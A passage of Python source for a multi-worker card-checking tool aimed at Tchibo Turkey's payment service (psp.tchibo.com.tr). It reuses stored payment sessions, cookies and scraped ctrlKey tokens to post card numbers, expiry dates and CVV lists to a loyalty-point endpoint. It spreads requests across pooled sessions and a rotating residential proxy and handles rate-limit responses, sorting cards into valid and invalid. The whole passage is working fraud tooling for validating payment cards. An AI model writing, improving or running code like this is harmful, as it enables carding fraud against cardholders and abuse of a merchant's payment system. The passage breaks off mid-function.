    def refresh_keys_sync(self):
        """Refresh ctrlKey with retry"""
        if not self.automation:
            from tchibo_automation import TchiboPaymentAutomation
            proxy_url = PROXY_STATUS.get('proxy_url') if PROXY_STATUS.get('is_set') else None
            self.automation = TchiboPaymentAutomation(proxy=proxy_url)
            self.automation.payment_token = self.token
            self.automation.payment_secret = self.secret
            self.automation.payment_xcsrf = self.payment_xcsrf
            self.automation.ctrl_key = self.ctrl_key
            self.automation.pg_process_key = self.pg_process_key
            
            def get_cookie_domain(name):
                if 'payment' in name.lower():
                    return 'psp.tchibo.com.tr'
                return 'www.tchibo.com.tr'
            
            for name, value in self.cookies_dict.items():
                domain = get_cookie_domain(name)
                try:
                    self.automation.session.cookies.set(name, value, domain=domain, path='/')
                except:
                    self.automation.session.cookies.set(name, value)
        
        if not self.automation.payment_token or not self.automation.payment_secret:
            logger.debug(f"Worker {self.worker_id}: Missing token or secret for refresh")
            return False
        
        cookie_count = len(self.automation.session.cookies) if hasattr(self.automation.session, 'cookies') else 0
        logger.debug(f"Worker {self.worker_id}: Attempting refresh with {cookie_count} cookies, token={self.automation.payment_token[:20]}...")
        
        max_attempts = 2
        last_error = None
        
        for attempt in range(max_attempts):
            try:
                refresh_result = self.automation.refresh_ctrl_key()
                
                has_valid_ctrl_key = (self.automation.ctrl_key and 
                                     len(self.automation.ctrl_key) >= 10 and
                                     self.automation.ctrl_key.strip())
                
                if refresh_result and has_valid_ctrl_key:
                    self.ctrl_key = self.automation.ctrl_key
                    if self.automation.pg_process_key:
                        self.pg_process_key = self.automation.pg_process_key
                    
                    try:
                        for cookie in self.automation.session.cookies:
                            if hasattr(cookie, 'name') and hasattr(cookie, 'value'):
                                self.cookies_dict[cookie.name] = cookie.value
                    except:
                        try:
                            for name, value in self.automation.session.cookies.items():
                                self.cookies_dict[name] = value
                        except:
                            pass
                    
                    logger.debug(f"Worker {self.worker_id}: Successfully refreshed ctrlKey (attempt {attempt+1})")
                    return True
                elif has_valid_ctrl_key:
                    self.ctrl_key = self.automation.ctrl_key
                    if self.automation.pg_process_key:
                        self.pg_process_key = self.automation.pg_process_key
                    logger.debug(f"Worker {self.worker_id}: Using existing ctrlKey (function returned False but key exists)")
                    return True
                else:
                    last_error = f"refresh_ctrl_key returned False, ctrl_key={bool(self.automation.ctrl_key)}, key_len={len(self.automation.ctrl_key) if self.automation.ctrl_key else 0}"
            except Exception as e:
                last_error = str(e)
                logger.debug(f"Worker {self.worker_id} refresh attempt {attempt+1} error: {e}")
                import traceback
                logger.debug(traceback.format_exc())
            
            if attempt < max_attempts - 1:
                import time
                time.sleep(0.5)
        
        logger.debug(f"Worker {self.worker_id}: Failed to refresh keys after {max_attempts} attempts")
        return False
    
    async def check_card_async(self, card_number, month, year, cvv, client):
        """Check single card"""
        max_retries = 5
        
        for attempt in range(max_retries):
            try:
                if attempt > 0 and "2183" in str(getattr(self, '_last_error', '')):
                    refresh_url = "https://psp.tchibo.com.tr/VPayment/VPayStepOptions_4"
                    try:
                        cookie_parts_refresh = []
                        for name, value in self.cookies_dict.items():
                            cookie_parts_refresh.append(f"{name}={value}")
                        
                        headers_refresh = {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                            "Cookie": "; ".join(cookie_parts_refresh) if cookie_parts_refresh else ""
                        }
                        
                        refresh_response = await client.get(refresh_url, headers=headers_refresh)
                        if refresh_response.status_code == 200:
                            import re
                            match = re.search(r'name=["\']ctrlKey["\'][^>]*value=["\']([^"\']+)["\']', refresh_response.text)
                            if match:
                                self.ctrl_key = match.group(1).strip()
                    except:
                        pass
                
                if not self.ctrl_key:
                    return {
                        'success': False,
                        'card': f"{card_number}|{month}|{year}|{cvv}",
                        'error': 'No ctrl key',
                        'points': 0.0
                    }
                
                params = f"?id={random.randint(100000, 999999)}"
                url = f"https://psp.tchibo.com.tr/VPayment/AjaxCall{params}"
                
                xcsrf_token = self.cookies_dict.get('PaymentXCSRF', self.payment_xcsrf or '')
                
                payload = {
                    "Shopizz_Ajax_Action_Public": "pg_getloyaltypoint",
                    "ctrlKey": self.ctrl_key or "",
                    "lp_cardnum": str(card_number),
                    "lp_cardholder": "",
                    "lp_cardmonth": str(month).zfill(2),
                    "lp_cardyear": str(year),
                    "lp_posid": "0",
                    "lp_cardid": "0",
                    "lp_sc": "0",
                    "pgProcessKey": self.pg_process_key or "",
                    "PaymentXCSRF": xcsrf_token
                }
                
                headers = {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin": "https://psp.tchibo.com.tr",
                    "Referer": "https://psp.tchibo.com.tr/",
                    "X-Requested-With": "XMLHttpRequest",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache",
                    "Connection": "close",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
                }
                
                cookie_parts = []
                for name, value in self.cookies_dict.items():
                    cookie_parts.append(f"{name}={value}")
                if cookie_parts:
                    headers["Cookie"] = "; ".join(cookie_parts)
                
                try:
                    if attempt == 0 and hasattr(self, '_first_card_logged') == False:
                        self._first_card_logged = True
                        logger.info(f"Worker {self.worker_id}: First card check - URL: {url[:50]}...")
                        logger.info(f"Worker {self.worker_id}: First card check - ctrlKey: {self.ctrl_key[:30] if self.ctrl_key else 'None'}...")
                    
                    response = await client.post(url, data=payload, headers=headers)
                except httpx.ReadTimeout:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(0.5)
                        continue
                    return {
                        'success': False,
                        'card': f"{card_number}|{month}|{year}|{cvv}",
                        'error': 'Timeout (20s)',
                        'points': 0.0
                    }
                except httpx.ConnectError as e:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(0.5)
                        continue
                    return {
                        'success': False,
                        'card': f"{card_number}|{month}|{year}|{cvv}",
                        'error': f'ConnectError: {type(e).__name__}',
                        'points': 0.0
                    }
                except Exception as e:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(0.5)
                        continue
                    error_name = type(e).__name__
                    error_msg = str(e)[:30] if str(e) else error_name
                    return {
                        'success': False,
                        'card': f"{card_number}|{month}|{year}|{cvv}",
                        'error': f'Network: {error_msg}',
                        'points': 0.0
                    }
                
                if response.status_code != 200:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(0.5)
                        continue
                    return {
                        'success': False,
                        'card': f"{card_number}|{month}|{year}|{cvv}",
                        'error': f'HTTP {response.status_code}',
                        'points': 0.0
                    }
                
                try:
                    result = response.json()
                    if isinstance(result, str):
                        result = json.loads(result)
                except Exception as e:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(0.5)
                        continue
                    return {
                        'success': False,
                        'card': f"{card_number}|{month}|{year}|{cvv}",
                        'error': f'JSON parse: {str(e)[:30]}',
                        'points': 0.0
                    }
                
                error_msg = result.get('errorMsg', '') if isinstance(result, dict) else ''
                self._last_error = error_msg
                
                if 'çok fazla deneme' in error_msg.lower() or 'too many' in error_msg.lower():
                    return {
                        'success': False,
                        'card': f"{card_number}|{month}|{year}|{cvv}",
                        'error': 'Rate limited',
                        'points': 0.0,
                        'rate_limited': True
                    }
                
                if 'error 2183' in error_msg.lower() or 'hata kodu:2183' in error_msg.lower():
                    if attempt < max_retries - 1:
                        self.ctrl_key = None
                        continue
                
                if result.get('actionResult'):
                    points = result.get('resultObj', {}).get('Point', '0')
                    try:
                        points_value = float(points) if points else 0.0
                    except (ValueError, TypeError):
                        points_value = 0.0
                    
                    return {
                        'success': True,
                        'card': f"{card_number}|{month}|{year}|{cvv}",
                        'points': points_value
                    }
                else:
                    return {
                        'success': False,
                        'card': f"{card_number}|{month}|{year}|{cvv}",
                        'error': error_msg[:50] if error_msg else 'Unknown',
                        'points': 0.0
                    }
                        
            except Exception as e:
                if attempt < max_retries - 1:
                    await asyncio.sleep(0.5)
                    continue
                return {
                    'success': False,
                    'card': f"{card_number}|{month}|{year}|{cvv}",
                    'error': f'Unexpected: {str(e)[:35]}',
                    'points': 0.0
                }
        
        return {
            'success': False,
            'card': f"{card_number}|{month}|{year}|{cvv}",
            'error': 'All retries failed',
            'points': 0.0
        }
    
    def check_card_sync(self, card_number, month, year, cvv):
        """Check single card synchronously"""
        try:
            if not self.automation:
                from tchibo_automation import TchiboPaymentAutomation
                self.automation = TchiboPaymentAutomation(proxy=None)
                self.automation.payment_token = self.token
                self.automation.payment_secret = self.secret
                self.automation.payment_xcsrf = self.payment_xcsrf
                self.automation.ctrl_key = self.ctrl_key
                self.automation.pg_process_key = self.pg_process_key
                
                def get_cookie_domain(name):
                    if 'payment' in name.lower():
                        return 'psp.tchibo.com.tr'
                    return 'www.tchibo.com.tr'
                
                for name, value in self.cookies_dict.items():
                    domain = get_cookie_domain(name)
                    try:
                        self.automation.session.cookies.set(name, value, domain=domain, path='/')
                    except:
                        self.automation.session.cookies.set(name, value)
            
            result = self.automation.get_loyalty_point(
                card_number=card_number,
                card_month=month,
                card_year=year,
                card_holder="",
                pos_id=0,
                card_id=0,
                sc=0
            )
            
            if result.get('actionResult'):
                points = result.get('resultObj', {}).get('Point', '0')
                try:
                    points_value = float(points) if points else 0.0
                except (ValueError, TypeError):
                    points_value = 0.0
                
                return {
                    'success': True,
                    'card': f"{card_number}|{month}|{year}|{cvv}",
                    'points': points_value
                }
            else:
                return {
                    'success': False,
                    'card': f"{card_number}|{month}|{year}|{cvv}",
                    'error': result.get('errorMsg', 'Unknown'),
                    'points': 0.0
                }
        except Exception as e:
            return {
                'success': False,
                'card': f"{card_number}|{month}|{year}|{cvv}",
                'error': str(e)[:50],
                'points': 0.0
            }
    
    async def check_cards_only(self, cards, progress_callback=None):
        """Check cards asynchronously"""
        
        logger.info(f"Worker {self.worker_id}: ▶️  check_cards_only STARTED with {len(cards)} cards")
        logger.info(f"Worker {self.worker_id}: ctrl_key={self.ctrl_key[:20] if self.ctrl_key else 'None'}...")
        logger.info(f"Worker {self.worker_id}: cookies={len(self.cookies_dict)} items")
        
        proxy_url = PROXY_STATUS.get('proxy_url') if PROXY_STATUS.get('is_set') else None
        if proxy_url:
            logger.info(f"Worker {self.worker_id}: Using rotating residential proxy")
        
        limits = httpx.Limits(max_keepalive_connections=0, max_connections=100)
        async with httpx.AsyncClient(
            timeout=20.0, 
            verify=False, 
            proxy=proxy_url,
            limits=limits,
            http2=False
        ) as client:
            if not self.ctrl_key:
                refresh_url = "https://psp.tchibo.com.tr/VPayment/VPayStepOptions_4"
                try:
                    cookie_parts_refresh = []
                    for name, value in self.cookies_dict.items():
                        cookie_parts_refresh.append(f"{name}={value}")
                    
                    headers_refresh = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Cookie": "; ".join(cookie_parts_refresh) if cookie_parts_refresh else ""
                    }
                    
                    refresh_response = await client.get(refresh_url, headers=headers_refresh)
                    if refresh_response.status_code == 200:
                        import re
                        match = re.search(r'name=["\']ctrlKey["\'][^>]*value=["\']([^"\']+)["\']', refresh_response.text)
                        if match:
                            self.ctrl_key = match.group(1).strip()
                            logger.debug(f"Worker {self.worker_id}: Refreshed ctrlKey: {self.ctrl_key[:20]}...")
                except Exception as e:
                    logger.warning(f"Worker {self.worker_id}: Failed to refresh ctrlKey: {e}")
            
            async def check_with_metadata(i, card, parts):
                try:
                    result = await self.check_card_async(parts[0], parts[1], parts[2], parts[3], client)
                    if i == 0:
                        logger.info(f"Worker {self.worker_id}: First card result: success={result.get('success')}, error={result.get('error', 'none')[:30] if result.get('error') else 'none'}")
                    
                    self._store_result_realtime(result, parts)
                    
                    return (i, card, result)
                except Exception as e:
                    logger.error(f"Worker {self.worker_id}: check_with_metadata exception for card {i}: {e}")
                    error_result = {
                        'success': False,
                        'card': card,
                        'error': str(e)[:50],
                        'points': 0.0
                    }
                    self._store_result_realtime(error_result, parts)
                    return (i, card, error_result)
            
            processed_results = [None] * len(cards)
            completed = 0
            total_success = 0
            total_errors = 0
            
            logger.info(f"Worker {self.worker_id}: Processing {len(cards)} cards SEQUENTIALLY (1s delay per card)")
            
            for i, card in enumerate(cards):
                parts = card.strip().split('|')
                if len(parts) != 4:
                    logger.warning(f"Worker {self.worker_id}: Skipping invalid card format: {card[:20]}...")
                    continue
                
                if i > 0:
                    await asyncio.sleep(0.5)
                
                try:
                    idx, card_str, result = await check_with_metadata(i, card, parts)
                    processed_results[i] = result
                    
                    if result.get('success'):
                        total_success += 1
                    else:
                        total_errors += 1
                    
                    completed += 1
                    if progress_callback:
                        try:
                            progress_callback(completed, len(cards))
                        except:
                            pass
                    
                    if (i + 1) % 10 == 0 or i == len(cards) - 1:
                        logger.info(f"Worker {self.worker_id}: {i+1}/{len(cards)} cards done ({total_success} ok, {total_errors} err)")
                        
                except Exception as e:
                    logger.error(f"Worker {self.worker_id}: Error checking card {i}: {e}")
                    total_errors += 1
                    completed += 1
                    if progress_callback:
                        try:
                            progress_callback(completed, len(cards))
                        except:
                            pass
            
            final_results = [r for r in processed_results if r is not None]
            logger.info(f"Worker {self.worker_id}: ⏹️  check_cards_only RETURNING {len(final_results)} results")
            return final_results

class SessionPool:
    """Pre-initialized session pool for fast card checking"""
    
    def __init__(self, pool_size=30):
        self.pool_size = pool_size
        self.sessions = []
        self.lock = threading.Lock()
        self.current_index = 0
        self.initialized = False
    
    def load_sessions_from_db(self):
        """Load saved sessions from database and convert to workers"""
        saved_sessions = get_all_sessions()
        active_sessions = [s for s in saved_sessions if s.get("is_active", True)]
        
        logger.info(f"📂 Loading {len(active_sessions)} saved sessions from database...")
        
        workers = []
        for i, session_data in enumerate(active_sessions):
            try:
                cookies = session_data.get("cookies", {})
                if not cookies:
                    continue
                
                payment_token = cookies.get("payment_token") or session_data.get("session_token")
                payment_secret = cookies.get("payment_secret") or session_data.get("user_id")
                payment_xcsrf = cookies.get("payment_xcsrf")
                ctrl_key = cookies.get("ctrl_key")
                pg_process_key = cookies.get("pg_process_key")
                
                if not payment_token or not payment_secret:
                    continue
                
                worker = TchiboWorker(i, proxy=None)
                worker.token = payment_token
                worker.secret = payment_secret
                worker.payment_xcsrf = payment_xcsrf
                worker.ctrl_key = ctrl_key
                worker.pg_process_key = pg_process_key
                worker.cookies_dict = {}
                for k, v in cookies.items():
                    if k not in ['payment_token', 'payment_secret', 'payment_xcsrf', 'ctrl_key', 'pg_process_key']:
                        worker.cookies_dict[k] = v
                
                if payment_xcsrf:
                    worker.cookies_dict['PaymentXCSRF'] = payment_xcsrf
                
                cookie_count = len(worker.cookies_dict)
                logger.debug(f"Loaded session {i+1}: {cookie_count} cookies, token={bool(payment_token)}, secret={bool(payment_secret)}, xcsrf={bool(payment_xcsrf)}")
                
                has_critical_cookies = bool(payment_xcsrf) and cookie_count >= 3
                
                if not payment_xcsrf:
                    logger.debug(f"Session {i}: Missing PaymentXCSRF")
                if cookie_count < 3:
                    logger.debug(f"Session {i}: Only {cookie_count} cookies (need at least 3)")
                
                if not has_critical_cookies or not payment_token or not payment_secret:
                    logger.debug(f"Session {i}: Skipping incomplete session")
                    continue
                
                worker.automation = TchiboPaymentAutomation(proxy=None)
                worker.automation.payment_token = payment_token
                worker.automation.payment_secret = payment_secret
                worker.automation.payment_xcsrf = payment_xcsrf
                worker.automation.ctrl_key = ctrl_key
                worker.automation.pg_process_key = pg_process_key
                
                cookies_set_count = 0
                
                def get_cookie_domain(name):
                    """Determine appropriate domain for cookie"""
                    if name in ['PaymentXCSRF', 'Payment.SessionId', 'loadbalancepsp', 'l-fm-mid'] or name.startswith('TS'):
                        return 'psp.tchibo.com.tr'
                    elif name in ['grpToken', 'LongtermToken', 'damo_cache', 'x-hunter-site', 'akaas_segmentation_tr']:
                        return '.tchibo.com.tr'
                    else:
                        return 'psp.tchibo.com.tr'
                
                for name, value in worker.cookies_dict.items():
                    if name in ['payment_token', 'payment_secret', 'payment_xcsrf', 'ctrl_key', 'pg_process_key']:
                        continue
                    
                    domain = get_cookie_domain(name)
                    
                    try:
                        worker.automation.session.cookies.set(name, value, domain=domain, path='/')
                        cookies_set_count += 1
                    except:
                        try:
                            worker.automation.session.cookies.set(name, value)
                            cookies_set_count += 1
                        except:
                            try:
                                worker.automation.session.cookies[name] = value
                                cookies_set_count += 1
                            except:
                                pass
                
                if payment_xcsrf:
                    try:
                        worker.automation.session.cookies.set('PaymentXCSRF', payment_xcsrf, domain='psp.tchibo.com.tr', path='/')
                        cookies_set_count += 1
                    except:
                        try:
                            worker.automation.session.cookies.set('PaymentXCSRF', payment_xcsrf)
                            cookies_set_count += 1
                        except:
                            try:
                                worker.automation.session.cookies['PaymentXCSRF'] = payment_xcsrf
                                cookies_set_count += 1
                            except:
                                pass
                
                if not worker.automation.session.cookies.get('loadbalancepsp'):
                    loadbalance_value = '!9MF3IqMk+WsOO4lIPdCIc6XRgVcK9UnfPr9SiDnOnDKHuhqcFcQK9Y63i53VHP8drPXx5vFJu73qqw=='
                    try:
                        worker.automation.session.cookies.set('loadbalancepsp', loadbalance_value, domain='psp.tchibo.com.tr')
                        cookies_set_count += 1
                    except:
                        pass
                
                if not worker.automation.session.cookies.get('l-fm-mid'):
                    from datetime import datetime
                    import uuid
                    l_fm_mid_value = f"{datetime.now().strftime('%Y%m%d')}-{uuid.uuid4()}"
                    try:
                        worker.automation.session.cookies.set('l-fm-mid', l_fm_mid_value, domain='psp.tchibo.com.tr')
                        cookies_set_count += 1
                    except:
                        pass
                
                if hasattr(worker.automation, 'session'):
                    try:
                        worker.automation.payment_session_id = worker.automation.session.cookies.get('Payment.SessionId')
                        worker.automation.loadbalancepsp = worker.automation.session.cookies.get('loadbalancepsp')
                        worker.automation.l_fm_mid = worker.automation.session.cookies.get('l-fm-mid')
                    except:
                        pass
                
                try:
                    session_cookie_count = len(worker.automation.session.cookies)
                    has_xcsrf = False
                    try:
                        has_xcsrf = bool(worker.automation.session.cookies.get('PaymentXCSRF')) or bool(payment_xcsrf)
                    except:
                        has_xcsrf = 'PaymentXCSRF' in str(worker.automation.session.cookies) or bool(payment_xcsrf)
                    
                    if not has_xcsrf:
                        logger.debug(f"Session {i+1}: PaymentXCSRF not found in session cookies")
                    if session_cookie_count < 3:
                        logger.debug(f"Session {i+1}: Only {session_cookie_count} cookies in session")
                    
                    logger.debug(f"Session {i+1}: Set {cookies_set_count} cookies, session has {session_cookie_count}, XCSRF={has_xcsrf}")
                except Exception as e:
                    logger.debug(f"Session {i+1}: Cookie verification error: {e}")
                
                workers.append({
                    'success': True,
                    'worker': worker,
                    'proxy_info': 'saved_session'
                })
                
            except Exception as e:
                logger.debug(f"Failed to load session {i}: {e}")
                continue
        
        self.sessions = workers
        self.initialized = len(workers) > 0
        logger.info(f"✅ Loaded {len(workers)} sessions from database")
        return len(workers)
    
    async def initialize_pool(self):
        """Pre-initialize session pool"""
        if self.initialized:
            return
        
        logger.info(f"Pre-initializing {self.pool_size} sessions...")
        
        use_proxy = PROXY_STATUS.get('is_set', False) and PROXY_STATUS.get('proxy_url')
        configured_proxy = PROXY_STATUS.get('proxy_url') if use_proxy else None
        
        if configured_proxy:
            logger.info(f"   Using configured proxy: {configured_proxy.split('@')[1] if '@' in configured_proxy else configured_proxy}")
        else:
            logger.info(f"   No proxy configured - using direct connection")
        
        max_workers = min(self.pool_size, 100)
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            tasks = []
            for i in range(self.pool_size):
                worker_proxy = configured_proxy
                
                tasks.append(self._init_session_with_executor(i, worker_proxy, executor))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
        
        successful = 0
        failed = 0
        for i, result in enumerate(results):
            if isinstance(result, dict) and result.get('success'):
                self.sessions.append(result)
                successful += 1
                logger.info(f"   ✅ Session {i+1}/{self.pool_size}: Ready (proxy: {result.get('proxy_info', 'none')}) [{successful} successful]")
            else:
                failed += 1
                logger.warning(f"   ❌ Session {i+1}/{self.pool_size}: Failed [{failed} failed]")
        
        self.initialized = len(self.sessions) > 0
        logger.info(f"✅ Session pool ready: {len(self.sessions)}/{self.pool_size} sessions initialized ({successful} successful, {failed} failed)")
    
    async def _init_session_with_executor(self, session_id, proxy, executor):
        """Initialize a single session"""
        try:
            await asyncio.sleep(session_id * 0.05)
            
            worker = TchiboWorker(session_id, proxy=proxy)
            loop = asyncio.get_running_loop()
            
            try:
                init_task = loop.run_in_executor(executor, worker.init_session)
                success = await asyncio.wait_for(init_task, timeout=90)
                
                if success and worker.token and worker.secret:
                    try:
                        refresh_task = loop.run_in_executor(executor, worker.refresh_keys_sync)
                        await asyncio.wait_for(refresh_task, timeout=10)
                    except:
                        pass
                    
                    proxy_info = proxy.split('@')[1] if proxy and '@' in proxy else 'none'
                    return {
                        'success': True,
                        'worker': worker,
                        'proxy_info': proxy_info
                    }
                else:
                    logger.debug(f"Session {session_id}: init_session returned False or missing credentials")
                    
            except asyncio.TimeoutError:
                logger.warning(f"Session {session_id}: Timeout after 60s")
            except Exception as e:
                logger.debug(f"Session {session_id}: Exception: {e}")
            
            return {'success': False}
        except Exception as e:
            logger.debug(f"Session {session_id}: Outer exception: {e}")
            return {'success': False}
    
    async def _init_session(self, session_id, proxy):
        """Initialize a single session with fallbacks"""
        try:
            worker = TchiboWorker(session_id, proxy=proxy)
            loop = asyncio.get_running_loop()
            
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    success = await loop.run_in_executor(None, worker.init_session)
                    if success:
                        await loop.run_in_executor(None, worker.refresh_keys_sync)
                        if worker.ctrl_key and worker.token and worker.secret:
                            proxy_info = proxy.split('@')[1] if proxy and '@' in proxy else 'none'
                            return {
                                'success': True,
                                'worker': worker,
                                'proxy_info': proxy_info
                            }
                        else:
                            if attempt == max_retries - 1:
                                return {'success': False, 'error': 'Missing keys'}
                    else:
                        if attempt == max_retries - 1:
                            return {'success': False, 'error': 'Init failed'}
                except Exception:
                    if attempt == max_retries - 1:
                        return {'success': False, 'error': 'Exception occurred'}
                
                if attempt < max_retries - 1:
                    await asyncio.sleep(0.5)
            
            return {'success': False, 'error': 'Failed after retries - check logs'}
        except Exception:
            return {'success': False, 'error': 'Init failed'}
    
    def get_session(self):
        """Get a session from pool"""
        with self.lock:
            if not self.sessions:
                return None
            session = self.sessions[self.current_index % len(self.sessions)]
            self.current_index = (self.current_index + 1) % len(self.sessions)
            return session

_global_session_pool = None

def get_session_pool():
    """Get or create global session pool"""
    global _global_session_pool
    if _global_session_pool is None:
        _global_session_pool = SessionPool(pool_size=30)
    return _global_session_pool

class TchiboFastChecker:
    """Multi-worker checker with session pool"""
    
    def __init__(self, num_workers=10):
        self.num_workers = num_workers
        self.session_pool = get_session_pool()
    
    async def check_cards_parallel(self, cards):
        """Check cards with parallel workers"""
        start_time = time.time()
        
        if not self.session_pool.initialized:
            loaded_count = self.session_pool.load_sessions_from_db()
            if loaded_count == 0:
                logger.warning("No sessions loaded from database. Please create sessions first.")
                return [], time.time() - start_time
        
        available_sessions = len(self.session_pool.sessions)
        if available_sessions == 0:
            logger.warning("No available sessions in pool. Please create sessions first.")
            return [], time.time() - start_time
        
        num_workers_to_use = min(self.num_workers, available_sessions)
        logger.info(f"Checking {len(cards)} cards with {num_workers_to_use} workers...")
        
        cards_per_worker = len(cards) // num_workers_to_use
        remaining = len(cards) % num_workers_to_use
        
        def update_progress(completed, total_for_worker):
            with results_lock:
                processing_status["processed_cards"] += 1
        
        worker_tasks = []
        start_idx = 0
        
        for i in range(num_workers_to_use):
            worker_cards = cards_per_worker + (1 if i < remaining else 0)
            end_idx = start_idx + worker_cards
            batch = cards[start_idx:end_idx]
            
            if not batch:
                break
            
            session_data = self.session_pool.get_session()
            if not session_data:
                logger.warning(f"Worker {i+1}: No session available from pool")
                start_idx = end_idx
                continue
            
            worker = session_data['worker']
            
            logger.info(f"   Worker {i+1}: Processing {len(batch)} cards (indices {start_idx}-{end_idx-1})")
            
            worker_tasks.append(self._check_batch_with_session(worker, batch, i+1, update_progress))
            
            start_idx = end_idx
        
        all_results = await asyncio.gather(*worker_tasks, return_exceptions=True)
        
        logger.info(f"✅ All workers completed! Got {len(all_results)} worker results, aggregating...")
        
        results = []
        for i, worker_results in enumerate(all_results):
            if isinstance(worker_results, list):
                logger.info(f"   Worker {i+1}: {len(worker_results)} results")
                results.extend(worker_results)
            elif isinstance(worker_results, Exception):
                import traceback
                logger.error(f"   Worker {i+1}: FAILED with exception: {worker_results}")
                logger.error(f"   Worker {i+1} Traceback:\n{''.join(traceback.format_exception(type(worker_results), worker_results, worker_results.__traceback__))}")
            else:
                logger.error(f"   Worker {i+1}: Unexpected type {type(worker_results)} - VALUE: {str(worker_results)[:100]}")
        
        logger.info(f"📊 Total aggregated results: {len(results)} cards")
        
        elapsed = time.time() - start_time
        
        return results, elapsed
    
    async def _check_batch_with_session(self, worker, cards, worker_id, progress_callback=None):
        """
        Check batch of cards using httpx - refresh ctrlKey ONCE, then reuse for all 100 cards
        Pattern: 1 worker = 1 ctrlKey refresh = 100 card checks
        After 100 cards, if there are more batches, refresh again
        """
        logger.info(f"Worker {worker_id}: ▶️  _check_batch_with_session STARTED with {len(cards)} cards")
        try:
            loop = asyncio.get_running_loop()
            
            stagger_delay = (worker_id - 1) * 0.2
            if stagger_delay > 0:
                await asyncio.sleep(stagger_delay)
            
            logger.info(f"Worker {worker_id}: Refreshing ctrlKey for batch of {len(cards)} cards...")
            success = await loop.run_in_executor(None, worker.refresh_keys_sync)
            if not success or not worker.ctrl_key:
                has_token = bool(worker.automation.payment_token if worker.automation else False)
                has_secret = bool(worker.automation.payment_secret if worker.automation else False)
                cookie_count = len(worker.automation.session.cookies) if worker.automation and hasattr(worker.automation, 'session') else 0
                
                error_msg = f'Session expired or invalid (token={has_token}, secret={has_secret}, cookies={cookie_count})'
                logger.warning(f"Worker {worker_id}: {error_msg}")
                
                return [{
                    'success': False,
                    'card': card,
                    'error': error_msg,
                    'points': 0.0
                } for card in cards]
            
            logger.info(f"Worker {worker_id}: Got ctrlKey, checking {len(cards)} cards with same key...")
            
            if worker.automation:
                worker.automation.ctrl_key = worker.ctrl_key
                if worker.pg_process_key:
                    worker.automation.pg_process_key = worker.pg_process_key
            
            results = await worker.check_cards_only(cards, progress_callback=progress_callback)
            
            logger.info(f"Worker {worker_id}: Completed batch - got {len(results)} results")
            
            if results and len(results) > 0:
                success_count = sum(1 for r in results if isinstance(r, dict) and r.get('success'))
                error_count = sum(1 for r in results if isinstance(r, dict) and not r.get('success'))
                logger.info(f"Worker {worker_id}: {success_count} success, {error_count} errors")
            else:
                logger.warning(f"Worker {worker_id}: Returned EMPTY results list!")
            
            logger.info(f"Worker {worker_id}: ⏹️  _check_batch_with_session RETURNING {len(results)} results")
            return results
            
        except Exception as e:
            import traceback
            error_msg = str(e)
            logger.error(f"Worker {worker_id}: ❌ Card checking error: {error_msg}")
            logger.error(f"Worker {worker_id}: Traceback:\n{traceback.format_exc()}")
            error_results = [{
                'success': False,
                'card': card,
                'error': f'{error_msg[:50]}',
                'points': 0.0
            } for card in cards]
            logger.info(f"Worker {worker_id}: ⏹️  _check_batch_with_session RETURNING {len(error_results)} error results after exception")
            return error_results

def load_proxy_config():
    try:
        if os.path.exists(PROXY_CONFIG_FILE):
            with open(PROXY_CONFIG_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content:
                    return json.loads(content)
        return None
    except Exception as e:
        logger.debug(f"Error loading proxy config: {e}")
    return None

def save_proxy_config():
    try:
        config = {
            'is_set': PROXY_STATUS['is_set'],
            'proxy_url': PROXY_STATUS['proxy_url'],
            'rotation_enabled': PROXY_STATUS['rotation_enabled']
        }
        with open(PROXY_CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        logger.debug(f"Error saving proxy config: {e}")
        return False

def set_proxy(proxy_string):
    global PROXY_STATUS
    
    try:
        if not proxy_string or not isinstance(proxy_string, str):
            return False, "Invalid format"
        
        parts = proxy_string.strip().split(':')
        
        if len(parts) != 4:
            return False, "Format: host:port:user:pass"
        
        ip, port, user, password = parts
        
        try:
            port_int = int(port)
            if port_int < 1 or port_int > 65535:
                return False, "Invalid port"
        except ValueError:
            return False, "Invalid port"
        
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
        
        PROXY_STATUS['is_set'] = True
        PROXY_STATUS['proxy_url'] = proxy_url
        PROXY_STATUS['last_test'] = None
        PROXY_STATUS['test_result'] = None
        PROXY_STATUS['rotation_enabled'] = False
        
        save_proxy_config()
        logger.info(f"Proxy set: {ip}:{port}")
        return True, f"Proxy saved: {ip}:{port}"
        
    except Exception as e:
        logger.error(f"Error setting proxy: {e}")
        return False, str(e)

def clear_proxy():
    global PROXY_STATUS
    
    PROXY_STATUS['is_set'] = False
    PROXY_STATUS['proxy_url'] = None
    PROXY_STATUS['last_test'] = None
    PROXY_STATUS['test_result'] = None
    PROXY_STATUS['rotation_enabled'] = True
    PROXY_STATUS['current_proxy'] = None
    
    save_proxy_config()
    logger.info("Proxy cleared")
    return True, "OK"

def test_proxy():
    global PROXY_STATUS
    
    if PROXY_STATUS['rotation_enabled']:
        proxy_config = get_proxy_config('random')
        if not proxy_config['http']:
            return False, "No proxy found"
        
        try:
            start_time = time.time()
            test_url = "https://httpbin.org/ip"
            response = requests.get(test_url, proxies=proxy_config, timeout=10)
            end_time = time.time()
            response_time = int((end_time - start_time) * 1000)
            
            if response.status_code == 200:
                result = response.json()
                ip_address = result.get('origin', 'Unknown')
                PROXY_STATUS['last_test'] = datetime.now().isoformat()
